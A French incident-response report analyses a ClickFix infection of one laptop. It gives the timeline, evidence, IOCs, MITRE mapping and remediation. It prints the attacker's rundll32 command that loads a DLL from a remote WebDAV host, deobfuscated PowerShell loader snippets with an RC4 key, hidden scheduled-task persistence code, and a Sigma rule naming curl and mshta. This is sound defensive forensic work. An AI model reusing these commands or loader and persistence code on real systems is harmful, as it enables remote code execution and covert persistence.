# Rapport d'Investigation — Compromission `LAP-AICHAOUSSEI`

**Date du rapport** : 04 mai 2026
**Date de l'incident** : 27 mars 2026, 11:49:23 (UTC+1)
**Poste impacté** : `LAP-AICHAOUSSEI`
**Utilisateur** : `LAP-AICHAOUSSEI\user`
**Classification** : Compromission confirmée — exécution de code à distance + persistance
**Statut** : Investigation terminée — remédiation requise

---

## 1. Résumé exécutif

Le 27 mars 2026 à **11:49:23 (UTC+1)**, le poste `LAP-AICHAOUSSEI` a été compromis suite à une attaque par ingénierie sociale de type **ClickFix / FileFix**. L'utilisatrice a copié-collé une commande malveillante depuis une page web dans la boîte de dialogue **Win+R** (Exécuter), ce qui a déclenché l'exécution distante d'une DLL malveillante via WebDAV, puis l'exécution d'un loader PowerShell hautement obfusqué (RC4 + base64). Le malware a ensuite déployé un binaire Python signé renommé en `FNPLicensingService.exe` pour effectuer du **DLL sideloading**, et a installé une **tâche planifiée cachée** assurant la persistance toutes les 10 minutes pendant 365 jours.

**Vecteur d'entrée** : ClickFix manuel (Win+R)
**TTP MITRE ATT&CK** : T1059.001 (PowerShell), T1218.011 (rundll32), T1574.002 (DLL Sideloading), T1053.005 (Scheduled Task), T1027 (Obfuscated Files), T1573.001 (Encrypted Channel — RC4), T1204.004 (User Execution: Malicious Copy & Paste)

---

## 2. Méthodologie & sources de preuves

### Données collectées sur le poste compromis

| Source | Fichier | Statut |
|---|---|---|
| ScriptBlock logs PowerShell (Event 4104) | `powershell_scriptblocks_drop.txt` (3 MB, 175 events) | ✅ Exploitable |
| Event 4103 PowerShell Operational | `ps_operational.txt` (2.6 MB) | ✅ Exploitable |
| Windows PowerShell classic logs | `ps_classic.txt` (32 KB) | ✅ Exploitable |
| Run Dialog MRU (registre) | `runmru.txt` (430 B) | ✅ **Preuve clé** |
| Tâches planifiées listées | `sched_tasks_list.txt` (11 KB) | ⚠️ Tâche malveillante absente (filtrée ou supprimée) |
| EXE suspects récents | `suspicious_exes.txt` (43 KB) | ✅ **Preuve clé** |
| Prefetch | `prefetch.txt` (13 KB) | ✅ Exploitable |
| Téléchargements navigateur | `downloads.txt` (5 KB) | ✅ Exploitable |
| Chrome History (SQLite) | `chrome_History.db` (9.3 MB) | ✅ Exploitable |
| Edge History (SQLite) | `edge_History.db` (295 KB) | ⚠️ Aucune activité le 27/03 |
| Cache Chrome 11:30-12:00 | `chrome_cache_27mars.zip` | ⚠️ Seulement 2 fichiers Facebook |
| Sysmon Event ID 1 | `sysmon_proc_create.txt` | ❌ **Sysmon non installé** |
| Security Event 4688 | `security_4688.txt` | ❌ **Audit non activé** |

### Limites de l'investigation

- **Sysmon n'est pas installé** sur le poste → impossible d'observer la création de processus avec ligne de commande complète et processus parent
- **L'audit Security 4688 n'est pas activé** → mêmes conséquences
- **La page web malveillante visitée par l'utilisatrice n'a pas pu être identifiée précisément** (probablement consultée en mode incognito Chrome — trou de 54 minutes dans l'historique pile pendant l'infection)

---

## 3. Timeline détaillée

| Heure (UTC+1) | Événement | Source |
|---|---|---|
| 11:36:48 | Recherche Google : "rhinoplastie MEDICALE cameroun" | `chrome_History.db`, table `urls` |
| 11:36:59 | Visite : `https://virtualcliniccm.org/sejour-medical-au-cameroun-...` | `chrome_History.db` |
| 11:39:16 | Visite : `https://simbockhillsplasticsurgery.com/accueil/` | `chrome_History.db` |
| 11:42:55 | Visite : `https://virtualcliniccm.org/` | `chrome_History.db` |
| 11:43:41 | Recherche Google : "aller en turquie pour refaire son nez" | `chrome_History.db` |
| 11:44:05 | Recherche Google : "aller en turquie pour refaire son nez partant du camroun" — **dernière activité Chrome avant l'infection** | `chrome_History.db`, visit_id=12525 |
| 11:44 → 11:49 | **Période muette** — page malveillante consultée probablement en incognito | (aucune trace) |
| **11:49:23** | **🦠 INFECTION** : `rundll32.exe \\assetfilter.zenithpatron.in.net\verification.google,#1` exécuté depuis Win+R | `runmru.txt` + `ps_operational.txt` |
| 11:49:23 | Lancement `powershell.exe -NoP -NoLogo -NonI -Command -` (script piped via STDIN) | `ps_operational.txt` Event 4103 |
| 11:49:23 | Exécution du loader 66-chunks RC4+base64 | `powershell_scriptblocks_drop.txt` (sbid `c7ebd689-d485-4634-8987-c685e9e78183`) |
| 11:49:29-32 | Imports de modules `NetAdapter`, `ScheduledTask` (cmdletization auto-generated scriptblocks) | `powershell_scriptblocks_drop.txt` |
| 11:49:42 | Exécution payload niveau 2 — 21-chunks (HttpClient, ZipArchive, Register-ScheduledTask) | sbid `4c8aea3e-76fb-40c6-aaa3-ba5fc9509f91` |
| 11:49:43 | Boucle de beaconing HTTPS (HttpClient async, jitter sleep 500-800ms, UA random) | sbid `3662a090-de88-4962-a3b7-87cfe5048120` |
| **12:00:02** | **Drop** de `FNPLicensingService.exe` (104 792 octets) dans `%APPDATA%\Roaming\Intel\GPUCache\intcache\2cffb1d34d8f67bc_QUARANTINE_DO_NOT_DELETE\` | `suspicious_exes.txt` |
| 12:00:02 | 1er tick de la tâche planifiée (filtre callback) | sbid `a81d5bef-085f-4071-adc6-072162c7bbc2` |
| 12:03:13 | Tick suivant + import `ScheduledTask` cmdletization | sbid `8b5668ac-136a-4543-84db-a862c8bcce51` |
| 12:38:37 | **Reprise activité Chrome** (Google Gemini) | `chrome_History.db` |
| 12:54:31 | Recherche Google "Telecharger DBeaver" | `chrome_History.db` |
| 12:56:11 | Téléchargement DBeaver depuis `dbeaver.io` (✅ légitime) | `chrome_History.db`, table `downloads` |

---

## 4. Vecteur d'entrée — ClickFix / FileFix

### 4.1 Preuve principale — Run Dialog MRU

Extrait textuel de `runmru.txt` :

```
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
    a    REG_SZ    rundll32.exe \\assetfilter.zenithpatron.in.net\verification.google,#1rundll32.exe \\assetfilter.zenithpatron.in.net\verification.google,#1rundll32.exe \\assetfilter.zenithpatron.in.net\verification.google,#1rundll32.exe \\assetfilter.zenithpatron.in.net\verif\1
    MRUList    REG_SZ    ba
    b    REG_SZ    taskschd.msc\1
```

**Analyse** :
- L'entrée `a` (commande malveillante) contient la chaîne `rundll32.exe \\assetfilter.zenithpatron.in.net\verification.google,#1` répétée **4 fois**.
- Cette répétition est la **signature caractéristique** des kits ClickFix : une page web utilise JavaScript (`navigator.clipboard.writeText`) pour copier la commande plusieurs fois dans le presse-papiers de la victime, garantissant l'exécution même si l'utilisateur tronque accidentellement le collage.
- L'entrée `b` montre que l'utilisatrice a ouvert **`taskschd.msc`** dans Win+R **après** la commande malveillante (`MRUList = ba` → b plus récent que a) — probablement pour vérifier les tâches planifiées une fois alertée.

### 4.2 Mécanisme de chargement distant

La commande `rundll32.exe \\<host>\<dll>,#<ordinal>` :
1. Force Windows à monter automatiquement le chemin UNC `\\assetfilter.zenithpatron.in.net\verification.google`
2. Si SMB (port 445) bloqué, Windows bascule automatiquement en **WebDAV** (HTTP/HTTPS) via le service `WebClient`
3. La DLL est **chargée en mémoire** sans téléchargement local visible (cache WebDAV transparent)
4. `,#1` indique l'export ordinal n°1 à exécuter

→ Ce mécanisme contourne l'écriture sur disque et donc l'analyse antivirus statique.

### 4.3 Confirmation par Prefetch

Extrait de `prefetch.txt` :
```
RUNDLL32.EXE-64324A2A.pf                  4/26/2026 6:04:43 PM
RUNDLL32.EXE-6F26928C.pf                  4/26/2026 6:04:42 PM
```

→ **2 instances distinctes** de `rundll32.exe` (hashes Prefetch différents) ont été exécutées récemment, correspondant aux 2 lignes de commande successives (la commande malveillante + une variante).

---

## 5. Chaîne d'attaque complète

```
[Page web malveillante consultée (Chrome incognito)]
              │
              │  Instructions affichées : "Pour vérifier que vous n'êtes pas un robot,
              │  appuyez Win+R puis collez ce code"
              ▼
[Win+R] rundll32.exe \\assetfilter.zenithpatron.in.net\verification.google,#1
              │
              │  WebDAV / SMB → DLL chargée en mémoire depuis le serveur attaquant
              ▼
[rundll32.exe x86 — 32-bit]  (export #1 = entrypoint malveillant)
              │
              │  Spawn 64-bit PowerShell via Sysnative
              │  Pipe le script obfusqué via STDIN (-Command -)
              ▼
[powershell.exe -NoP -NoLogo -NonI -Command -]
              │
              │  Script reçu : 66 chunks de scriptblock obfusqué
              │  - Variables aux noms-leurres ($adultGcc9378, $TalladegOffline, etc.)
              │  - Junk code (boucles vides, calculs inutiles, $false branches)
              │  - Reconstruction d'une chaîne base64 à partir d'un tableau (1187 .+= operations)
              │  - Substring(64) puis FromBase64String → bytes
              │  - Décryptage RC4 avec clé hardcodée
              │  - iex (Invoke-Expression) du résultat
              ▼
[Stage 2 — payload PowerShell décrypté]
              │
              │  - Téléchargement archive ZIP en mémoire
              │  - Extraction via [System.IO.Compression.ZipArchive]
              │  - Liste de marques cherchées : Microsoft, Intel, Adobe, NVIDIA, Google, Portmaster
              ▼
[Drop sur disque]
   Path : %APPDATA%\Roaming\Intel\GPUCache\intcache\
          2cffb1d34d8f67bc_QUARANTINE_DO_NOT_DELETE\
          FNPLicensingService.exe         (104 792 B, signé "Python Software Foundation")
          + DLL sidecar (à identifier)
              │
              │  FNPLicensingService.exe = binaire Python légitime renommé
              │  pour usurper le service de licences FlexNet (FlexLM)
              ▼
[Exécution sideloading]
   FNPLicensingService.exe charge la DLL sidecar via DLL Search Order Hijacking
              │
              ▼
[Persistance — Tâche planifiée]
   Register-ScheduledTask :
   - Nom : <var>-<SID utilisateur>
   - Hidden, RunLevel Limited
   - Trigger : Once + RepetitionInterval 10 min, Duration 365 jours
   - StartWhenAvailable, AllowStartIfOnBatteries, DontStopIfGoingOnBatteries
              │
              ▼
[C2 — Beaconing HTTPS]
   HttpClient avec :
   - User-Agent randomisé
   - Sleep jitter (Math.Max(500, Math.Min(800, Round(500 + 800 * gaussian))))
   - SecurityProtocol = Tls12 | Tls11 | Tls
   - AutomaticDecompression = GZip | Deflate
   - Timeout 2s
   - Cookie machine = MachineGuid (HKLM\SOFTWARE\Microsoft\Cryptography)
```

---

## 6. Analyse technique du loader (Stage 1)

### 6.1 Caractéristiques

- **Format** : PowerShell brut, ~920 KB de source, distribué en 66 scriptblocks (Event 4104 chunks)
- **ScriptBlock ID** : `c7ebd689-d485-4634-8987-c685e9e78183`
- **Path** : *(vide — exécution fileless)*
- **Stratégies d'obfuscation** :
  - 90% du code est du **junk code** (assignations, calculs, `if ($false) { ... }`, boucles vides)
  - Le payload base64 est concaténé via **1187 opérations** `$adultGcc9378 += @("WFhYW...", "hYWFhY...", ...)`
  - Chaque chunk base64 est court (5-15 caractères) et entremêlé avec du junk
  - Les noms de variables sont aléatoires/leurres : `$TalladegOffline`, `$JohnnieFishing`, etc.

### 6.2 Stage 1 → Stage 2

Le code de "réveil" :
```powershell
$mathematicalProjection6167 = $adultGcc9378 -join ""
$courtPayment7438 = (4 * 10 - 18 + 22 + 20)        # = 64
$mathematicalProjection6167 = $mathematicalProjection6167.Substring($courtPayment7438)
&(gal ([string]::new(([char[]]@(105,101,120))))) `   # gal = Get-Alias, 'iex'
  ([Text.Encoding]::('UTF8').('Get'+'Str'+'in'+'g')(
    [System.Convert]::FromBase64String($mathematicalProjection6167)
  ))
```

→ Concatène les chunks, drop les 64 premiers caractères (padding aléatoire), décode le base64 et exécute via `iex`.

### 6.3 Stage 2 — RC4

Le résultat décodé contient :
- Une fonction RC4 (KSA + PRGA) implémentée avec des identifiants Unicode obfusqués (`$aaaaa…`, `$uuuuu…`, `$zzzzz…`, `$ÕÕÕ…`)
- Une grosse string ciphertext base64
- **Clé RC4 hardcodée (UTF-8)** :
  ```
  F1YFtXoG710avUMhXaSKz6KUlsAgnpxqkK7HoaD=kHLxNfoKpfhPlCbYSd/dHH8FZMLOxWBzDpoduGCYIKe6EVYUDl/01XUoV6WAPFPOUlF8W3mu6yKq6NbDb4VKWt0RkoLHYhbxpr97CrBwxiW2yTUC8wrra6M8l8eL0PhY1Yz=7y7qaprmI6org2Ro=XOH8cXhR22emMF1lxYKV2UnOiYEafVhYqgbSb2njg8ONc6xwu8w15ACsTltSzWgGz6l1e1aj5pKJnnqR6HsNRk3lwuifwKJcK3AuCbc=RdCZmpG7oeict3Nz/+/xkbcdH
  ```
- Décryptage du ciphertext (skip 195 premiers bytes), puis `& (GI Alias:\iex) $decrypted`

### 6.4 Capacités du payload final

Identifiées dans les scriptblocks 21-chunks et 15-chunks (ScriptBlock IDs `4c8aea3e-...` et `8b5668ac-...`) :

- **Téléchargement de fichiers** via `[System.Net.Http.HttpClient]` (anti-PSReadLine, async)
- **Décompression ZIP** via `[System.IO.Compression.ZipArchive]`
- **Recherche récursive d'EXE** via `Get-ChildItem -Filter "*.exe" -Recurse`
- **Création de tâche planifiée** via `Register-ScheduledTask`, paramètres :
  ```
  -Action (New-ScheduledTaskAction -Execute $exe -Argument "`"$sidecar`"")
  -Trigger (New-ScheduledTaskTrigger -Once -At (Get-Date)
            -RepetitionInterval (New-TimeSpan -Minutes 10)
            -RepetitionDuration (New-TimeSpan -Days 365))
  -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries
             -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden)
  -Principal (New-ScheduledTaskPrincipal -UserId $env:USERNAME
              -LogonType Interactive -RunLevel Limited)
  ```
- **Identification machine** via `MachineGuid` (`HKLM:\SOFTWARE\Microsoft\Cryptography`)
- **Liste de marques** pour camouflage : `("{1}{0}" -f "rosoft","Mic")` → "Microsoft", `[char[]]@('I','n','t','e','l') -join ''` → "Intel", `("Adob#" -replace '#','e')` → "Adobe", `("{1}{0}" -f "DIA","NVI")` → "NVIDIA", `(-join ('elgooG')[-1..-6])` → "Google", `("{1}{0}" -f "ster","Portma")` → "Portmaster"

---

## 7. Persistance — DLL Sideloading

### 7.1 Binaire abusé

Extrait de `suspicious_exes.txt` :
```
FullName        : C:\Users\user\AppData\Roaming\Intel\GPUCache\intcache\
                  2cffb1d34d8f67bc_QUARANTINE_DO_NOT_DELETE\FNPLicensingService.exe
Length          : 104792
LastWriteTime   : 3/27/2026 12:00:02 PM
SignatureStatus : Valid
SignerCN        : CN=Python Software Foundation, O=Python Software Foundation,
                  L=Beaverton, S=Oregon, C=US
SHA256          : B35F09B876EDB18695347860F79ACDDC68993F711274556156769476CD05AE8A
```

### 7.2 Pourquoi `FNPLicensingService.exe` ?

`FNPLicensingService.exe` est légitimement un binaire **FlexNet Publisher (FlexLM)** signé Flexera Inc. — utilisé pour la gestion de licences logicielles. Ici, l'attaquant a renommé un binaire **Python** signé (`py.exe` ou `pythonw.exe` — taille 104 KB cohérente avec un launcher Python) en `FNPLicensingService.exe`. Astuce :
- **La signature Authenticode est valide** → bypass des contrôles AV basiques sur "fichier signé"
- **Le nom évoque un service de licence légitime** → bypass humain
- **Le chemin** `%APPDATA%\Roaming\Intel\GPUCache\intcache\` mime des dossiers Intel pour camouflage

### 7.3 Sideloading

Le binaire Python est lancé avec un **chemin de DLL contrôlé** par l'attaquant. Lors du chargement, Python recherche ses DLL dépendantes (`python3X.dll`, libs annexes) selon l'ordre de recherche Windows. L'attaquant place une **DLL malveillante du même nom** dans le même dossier, qui est chargée en priorité.

Cette DLL contient le véritable malware (probablement du C2/RAT).

### 7.4 Tâche planifiée — **PREUVE DIRECTE**

Vérification ultérieure via `Get-ScheduledTask` (sans filtre date) — la tâche est **présente sur le poste** :

```
TaskName  : AGCO Terms About 44060-S-1-5-21-408779975-2862430630-947889534-1001
TaskPath  : \
State     : Disabled
Execute   : C:\Users\user\AppData\Roaming\Intel\GPUCache\intcache\
            2cffb1d34d8f67bc\FNPLicensingService.exe
Arguments : "C:\Users\user\AppData\Roaming\Intel\GPUCache\intcache\
            2cffb1d34d8f67bc\node_modules.asar"
Trigger   : PT10M (10 minutes)
```

**Décomposition** :
- **Nom de tâche** : `AGCO Terms About 44060` (préfixe random) + `-` + SID Windows utilisateur (`S-1-5-21-408779975-2862430630-947889534-1001`)
- **Execute** : `FNPLicensingService.exe` ← le binaire signé Python renommé (DLL sideloading host)
- **Arguments** : `node_modules.asar` ← **payload sideloadé** (format d'archive Electron / TAR custom)
- **Trigger** : `PT10M` = ISO 8601 duration de 10 minutes ✅ correspond exactement à la `RepetitionInterval` du code PowerShell décompilé
- **State** : `Disabled` — ⚠️ probablement neutralisée par Microsoft Defender (voir §7.5)

### 7.5 Hypothèse — quarantaine Defender

Le drop initial observé est dans :
```
C:\Users\user\AppData\Roaming\Intel\GPUCache\intcache\2cffb1d34d8f67bc_QUARANTINE_DO_NOT_DELETE\FNPLicensingService.exe
```

Tandis que la tâche planifiée pointe vers :
```
C:\Users\user\AppData\Roaming\Intel\GPUCache\intcache\2cffb1d34d8f67bc\FNPLicensingService.exe
```

Le suffixe `_QUARANTINE_DO_NOT_DELETE` est caractéristique d'un renommage par **Microsoft Defender** (mécanisme de quarantaine non destructive). Cela signifie que :
1. Defender a probablement détecté le comportement après le drop initial
2. Defender a renommé le dossier d'origine pour neutraliser le sideloading
3. La tâche planifiée pointe vers le path d'origine (qui n'existe plus) → tâche Disabled → la persistance est cassée

**🛡️ Microsoft Defender a probablement sauvé la machine** en bloquant le sideloading post-drop.

### 7.6 Nouveau IOC — `node_modules.asar`

Le fichier `node_modules.asar` (format archive Electron) est le **payload effectif** chargé par la chaîne de sideloading :
- Format : Electron Atom Shell Archive (header JSON + concat de fichiers)
- Position : même dossier que `FNPLicensingService.exe`
- Probablement : conteneur d'un runtime + script malveillant (Python ou JS) chargé par DLL companion ou par le binaire host lui-même

---

## 8. Indicators of Compromise (IOCs)

### 8.1 Réseau

| Type | Valeur | Notes |
|---|---|---|
| FQDN | `assetfilter.zenithpatron.in.net` | Hôte WebDAV servant la DLL initiale |
| Domaine | `zenithpatron.in.net` | Domaine attaquant |
| TLD | `*.in.net` | Sous-domaines gratuits — à surveiller globalement |
| Type de connexion | UNC SMB → fallback WebDAV (HTTP/HTTPS) | Service `WebClient` requis |

### 8.2 Fichiers

| Type | Valeur |
|---|---|
| Binaire host (sideloading) | `FNPLicensingService.exe` |
| SHA-256 | `B35F09B876EDB18695347860F79ACDDC68993F711274556156769476CD05AE8A` |
| Taille | 104 792 octets |
| Signataire (renommage trompeur) | `CN=Python Software Foundation, O=Python Software Foundation, L=Beaverton, S=Oregon, C=US` |
| Path post-Defender | `%APPDATA%\Roaming\Intel\GPUCache\intcache\2cffb1d34d8f67bc_QUARANTINE_DO_NOT_DELETE\FNPLicensingService.exe` |
| Path original (tâche pointe ici) | `%APPDATA%\Roaming\Intel\GPUCache\intcache\2cffb1d34d8f67bc\FNPLicensingService.exe` |
| Payload sideloadé | `node_modules.asar` (même dossier) |
| Dossier de drop pattern | `%APPDATA%\Roaming\Intel\GPUCache\intcache\<hex16>\` |

### 8.3 Tâche planifiée

| Type | Valeur |
|---|---|
| Nom | `AGCO Terms About 44060-<SID utilisateur>` |
| TaskPath | `\` (racine) |
| Trigger | `PT10M` (10 minutes ISO 8601) |
| Duration | 365 jours |
| Hidden | Oui |
| RunLevel | Limited |
| State observée | Disabled (probablement par Defender) |

### 8.4 Hôte / process

| Type | Valeur |
|---|---|
| Processus initial | `rundll32.exe` (32-bit) avec UNC argument |
| Processus enfant | `C:\WINDOWS\Sysnative\WindowsPowerShell\v1.0\powershell.exe -NoP -NoLogo -NonI -Command -` |
| User context | `LAP-AICHAOUSSEI\user` |
| ScriptBlock GUID Stage 1 | `c7ebd689-d485-4634-8987-c685e9e78183` |
| ScriptBlock GUID Stage 2 (21-chunks) | `4c8aea3e-76fb-40c6-aaa3-ba5fc9509f91` |
| ScriptBlock GUID beacon | `3662a090-de88-4962-a3b7-87cfe5048120` |

### 8.5 Cryptographique

| Type | Valeur |
|---|---|
| Clé RC4 (UTF-8) | `F1YFtXoG710avUMhXaSKz6KUlsAgnpxqkK7HoaD=kHLxNfoKpfhPlCbYSd/dHH8FZMLOxWBzDpoduGCYIKe6EVYUDl/01XUoV6WAPFPOUlF8W3mu6yKq6NbDb4VKWt0RkoLHYhbxpr97CrBwxiW2yTUC8wrra6M8l8eL0PhY1Yz=7y7qaprmI6org2Ro=XOH8cXhR22emMF1lxYKV2UnOiYEafVhYqgbSb2njg8ONc6xwu8w15ACsTltSzWgGz6l1e1aj5pKJnnqR6HsNRk3lwuifwKJcK3AuCbc=RdCZmpG7oeict3Nz/+/xkbcdH` |
| Pad ciphertext skip | 195 octets |

### 8.6 Comportementaux

| Indicateur | Description |
|---|---|
| RunMRU pattern | Commande répétée 4× dans une même entrée RunMRU |
| User-Agent | Aléatoire (rotation à chaque requête) |
| Beaconing interval | 10 minutes (RepetitionInterval scheduledtask) |
| Sleep jitter | 500-800 ms (gaussien) entre requêtes du beacon |
| HTTP timeout | 2 secondes |

---

## 9. Preuves numériques détaillées

### 9.1 Preuve A — Commande Win+R malveillante

**Fichier source** : `runmru.txt`
**Ligne 3** :
```
    a    REG_SZ    rundll32.exe \\assetfilter.zenithpatron.in.net\verification.google,#1rundll32.exe \\assetfilter.zenithpatron.in.net\verification.google,#1rundll32.exe \\assetfilter.zenithpatron.in.net\verification.google,#1rundll32.exe \\assetfilter.zenithpatron.in.net\verif\1
```

**Conclusion** : confirme l'exécution manuelle par l'utilisatrice, déclenchée par une page web ClickFix.

### 9.2 Preuve B — Ligne de commande PowerShell

**Fichier source** : `ps_operational.txt`, premier Event 4103 du 27/03/2026 à 11:49:43
```
TimeCreated : 3/27/2026 11:49:43 AM
Id          : 4103
Message     : ...
              Application hôte = C:\WINDOWS\Sysnative\WindowsPowerShell\v1.0\powershell.exe
                                 -NoP -NoLogo -NonI -Command -
              Version du moteur = 5.1.26100.7920
              ID d'instance d'exécution = 4c737f6b-4d12-406b-a05c-6ff7f9ccad33
              Utilisateur = LAP-AICHAOUSSEI\user
```

**Conclusion** :
- `Sysnative` confirme un processus parent **32-bit** (cohérent avec `rundll32.exe x86`)
- `-Command -` confirme que le script a été **passé via STDIN**, pas via fichier ni `-EncodedCommand`
- L'absence de `Chemin d'accès` sur tous les ScriptBlocks confirme l'exécution **fileless**

### 9.3 Preuve C — Drop du binaire

**Fichier source** : `suspicious_exes.txt`
```
FullName        : C:\Users\user\AppData\Roaming\Intel\GPUCache\intcache\
                  2cffb1d34d8f67bc_QUARANTINE_DO_NOT_DELETE\FNPLicensingService.exe
Length          : 104792
LastWriteTime   : 3/27/2026 12:00:02 PM
SignatureStatus : Valid
SignerCN        : CN=Python Software Foundation, ...
SHA256          : B35F09B876EDB18695347860F79ACDDC68993F711274556156769476CD05AE8A
```

**Cohérence temporelle** :
- 11:49:23 : infection initiale
- 12:00:02 : drop du binaire = ~11 minutes plus tard, cohérent avec le 1er tick de la tâche planifiée (RepetitionInterval = 10 min)

### 9.4 Preuve D — Exécution rundll32.exe

**Fichier source** : `prefetch.txt` lignes 131-132
```
RUNDLL32.EXE-64324A2A.pf                  4/26/2026 6:04:43 PM
RUNDLL32.EXE-6F26928C.pf                  4/26/2026 6:04:42 PM
```

**Conclusion** : Deux instances distinctes de `rundll32.exe` (hashes Prefetch différents) ont été exécutées. La date `4/26/2026` correspond au dernier tick de l'instance avant collecte (les Prefetch enregistrent uniquement le dernier `LastWriteTime`).

### 9.5 Preuve E — Loader PowerShell obfusqué

**Fichier source** : `powershell_scriptblocks_drop.txt`
- 175 ScriptBlocks au total
- 41 ScriptBlocks contiennent `$adultGcc9378` (la variable accumulant le payload base64)
- 1 occurrence de `[System.Convert]::FromBase64String` (le decoder)
- 1 occurrence de la pattern `&(gal ([string]::new(([char[]]@(105,101,110)))))` → décodé en `iex`

**Extrait** (ligne 31429) :
```powershell
$mathematicalProjection6167 = $adultGcc9378 -join ""
$courtPayment7438 = (4 * 10 - 18 + 22 + 20)
$mathematicalProjection6167 = $mathematicalProjection6167.Substring($courtPayment7438)
&(gal ([string]::new(([char[]]@(105,101,120)))))
  ([Text.Encoding]::('UTF8').('Get'+'Str'+'in'+'g')(
    [System.Convert]::FromBase64String($mathematicalProjection6167)
  ))
```

### 9.6 Preuve F — Persistance via Register-ScheduledTask

**Fichier source** : reconstitué depuis `powershell_scriptblocks_drop.txt` (size 21-chunks, sbid `4c8aea3e-...`), normalisé :
```powershell
$action  = New-ScheduledTaskAction -Execute $exePath -Argument "`"$sidecarPath`""
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) `
           -RepetitionInterval (New-TimeSpan -Minutes 10) `
           -RepetitionDuration (New-TimeSpan -Days 365)
Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger `
   -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries `
              -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden -EA 0) `
   -Principal (New-ScheduledTaskPrincipal -UserId $env:USERNAME `
               -LogonType Interactive -RunLevel Limited -EA 0) `
   -Force -EA 0 | Out-Null
```

### 9.7 Preuve G — Timeline navigation

**Fichier source** : `chrome_History.db` (table `visits` JOIN `urls`)

Dernières activités avant infection (timestamps Chrome convertis en UTC+1) :
| Heure | Type | URL/Action |
|---|---|---|
| 11:36:48 | GENERATED | `google.com/search?q=rhinoplastie+MEDICALE+cameroun` |
| 11:39:11 | FORM_SUBMIT | `google.com/search` (même requête) |
| 11:39:16 | LINK | `simbockhillsplasticsurgery.com/accueil/` |
| 11:42:55 | LINK | `virtualcliniccm.org/` |
| 11:43:41 | GENERATED | `google.com/search?q=aller+en+turquie+pour+refaire+son+nez` |
| 11:44:05 | FORM_SUBMIT | `google.com/search?q=aller+en+turquie+pour+refaire+son+nez+partant+du+camroun` |
| **11:44 → 12:38** | **TROU TOTAL** | (incognito présumé) |
| 12:38:37 | LINK | `gemini.google.com/app?hl=fr` |

### 9.8 Preuve H — Edge écarté

**Fichier source** : `edge_History.db`
- Date range historique : 30 janvier 2026 → 26 avril 2026
- **Visites le 27/03/2026 : 0**
- Downloads le 27/03/2026 : 0
- Aucun IOC trouvé

→ Edge n'a pas été utilisé pour la page malveillante.

### 9.9 Preuve I — Téléchargements légitimes (exclusion)

**Fichier source** : `downloads.txt`
- `dbeaver-ce-26.0.1-windows-x86_64.exe` à 12:59:18 → ✅ légitime, signé `DBeaver Corp`, téléchargé depuis `github.com/dbeaver/dbeaver` (vérifié dans `chrome_History.db` table `downloads`)

→ Aucun fichier téléchargé n'est l'agent initial — confirme la livraison **fileless via WebDAV**.

---

## 10. Recommandations de remédiation

### 10.1 Actions immédiates (poste compromis)

1. **Isoler le poste du réseau** (déconnecter Wi-Fi + Ethernet)
2. **Capturer une image forensique** complète avant nettoyage (KAPE est déjà disponible — vu dans `downloads.txt`)
3. **Re-imager** le poste — DLL sideloading + persistance + accès C2 = nettoyage manuel risqué
4. **Rotation immédiate** des credentials utilisés sur ce poste :
   - Mots de passe Edge / Chrome (saved passwords)
   - Tokens Outlook / OneDrive / Teams
   - Clés SSH éventuelles (`%USERPROFILE%\.ssh\`)
   - Tokens AD / Kerberos
   - Secrets dans VS Code / dotnet user-secrets
   - Credentials Azure / Office 365

### 10.2 Actions préventives (parc complet)

1. **Bloquer DNS** :
   - `*.zenithpatron.in.net`
   - À considérer : `*.in.net` (sous-domaines gratuits, peu utilisés en entreprise)

2. **Bloquer WebDAV sortant** sur le proxy/firewall (méthodes `PROPFIND`, `OPTIONS`, `LOCK`, `MKCOL`, `MOVE`)

3. **Désactiver le service WebClient** par GPO sur tout le parc :
   ```
   sc config WebClient start= disabled
   sc stop WebClient
   ```
   Ou via GPO : `Computer Config > Windows Settings > Security Settings > System Services > WebClient = Disabled`

4. **Restreindre Win+R via GPO** (option défensive contre ClickFix) :
   `User Configuration > Administrative Templates > Start Menu and Taskbar > Remove Run menu from Start Menu`

5. **Activer Sysmon + audit 4688** sur tout le parc :
   - Sysmon avec config SwiftOnSecurity ou Olaf Hartong
   - Activer "Audit Process Creation" + "Include command line in process creation events" via GPO

6. **Activer ASR Rules** (Microsoft Defender Attack Surface Reduction) :
   - `D4F940AB-401B-4EFC-AADC-AD5F3C50688A` (Block Office child process creation)
   - `D3E037E1-3EB8-44C8-A917-57927947596D` (Block JavaScript/VBScript launching downloaded executable content)
   - `92E97FA1-2EDF-4476-BDD6-9DD0B4DDDC7B` (Block Win32 API calls from Office macros)
   - `01443614-CD74-433A-B99E-2ECDC07BFC25` (Block executable files unless they meet a prevalence/age criteria)

### 10.3 Détection

Soumettre les IOCs suivants aux outils EDR / SIEM / threat intelligence :

- **Domaine** : `zenithpatron.in.net` → abuse.ch URLhaus, MISP, AlienVault OTX
- **SHA-256** : `B35F09B876EDB18695347860F79ACDDC68993F711274556156769476CD05AE8A` → VirusTotal, MalwareBazaar
- **Règle Sigma de détection RunMRU ClickFix** :
   ```yaml
   title: ClickFix RunMRU pattern
   logsource:
     product: windows
     category: registry_event
   detection:
     selection:
       TargetObject|contains: '\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU'
       Details|contains:
         - 'rundll32.exe \\\\'
         - 'powershell'
         - 'curl '
         - 'mshta '
         - 'iwr '
     repetition:
       Details|re: '(rundll32|powershell|mshta|curl).{1,200}\1'
     condition: selection and repetition
   ```

### 10.4 Sensibilisation utilisateurs

Communiquer le message suivant à toutes les utilisateurs :

> ⚠️ **Si une page web vous demande d'appuyer sur Win+R (Exécuter) et de coller un code pour "vérifier que vous êtes humain" ou "résoudre un problème", c'est TOUJOURS UNE ATTAQUE.**
>
> Aucun service légitime (Google, Microsoft, Cloudflare, Captcha, etc.) ne vous demandera jamais d'exécuter une commande Windows pour valider votre identité.
>
> En cas de doute : **ne pas coller, fermer la page, et signaler au service IT**.

---

## 11. TTP MITRE ATT&CK mapping

| Tactique | Technique | ID | Détails |
|---|---|---|---|
| Initial Access | Drive-by Compromise | T1189 | Page web ClickFix |
| Execution | User Execution: Malicious Copy and Paste | T1204.004 | Win+R copy-paste |
